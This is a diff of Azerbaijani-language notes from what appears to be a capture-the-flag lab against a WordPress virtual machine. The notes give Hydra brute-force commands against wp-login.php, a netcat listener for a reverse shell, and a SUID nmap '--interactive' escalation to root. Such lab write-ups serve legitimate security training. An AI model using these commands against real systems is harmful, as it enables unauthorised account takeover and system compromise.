@@ -17,10 +17,10 @@ bunlari hamsini browserde ip nin sonuna yazib baxacayig 192.168.56.101/admin ve 
 12.browserde 192.168.56.101/wp-admin yaziriq 
 13. burpsuite giririk
 open browser edirik, sonra oradan wo-admin hissesin kopy paste edib ora giririk, sonra 
-14.hydra -l testuser -p testparol 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.
+
 15.ls  eleyirik downloadsa giririk ls edirik yeniden evvelceden save etdiyimiz lughet.txt gelir sonra 
-cat lughet.txt | sort | uniq 
-hydra -V -L siyahi.txt -p testparol 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.'
+cat lughet.txt | sort | uniq > siyahi.txt
+hydra  -L siyahi.txt -p testparol 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.'
 burada poppetg user olaraq gelir sifrede gorunur ama o sifre sehvdir  adi firefoxda bunu yaziriq gorunurki sifre sehvdir
 hydra -l poppetg -P siyahi.txt 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered for the username.'
 bu kodu yaziriq burada hem user adi hemde parol gorunur  onlari yazib giririk
@@ -40,7 +40,7 @@ ve elave olaraq portu deyisirik 8081 qoyuruq
 nc -nvlp 8081 kodun yazib enter basiriq shell acilmis olur ls yazaraq yoxlayiriq
 
 17. find / -type f -name "*code-2-of-4.txt" 2>/dev/null
-cat /opt/bitnami/apps/wordpress/htdocs/
+cd /opt/bitnami/apps/wordpress/htdocs/
 ls 
 cat xikaxecclv6blevbuojtfdxy7t3z3qpa8wze3xzg-ServerS50-code-2-of-4.txt
 parol gelir sonra fso
@@ -61,7 +61,7 @@ find / -perm -4000 -type f 2>/dev/null
 /usr/local/bin/nmap localhost
 /usr/local/bin/nmap --interactive
 !sh
-id / whoami (iksinden birin yazanda root oldugumuzu goruruk)
+id / whoami
 cd/root
 ls
 cat code-4-of-4.txt
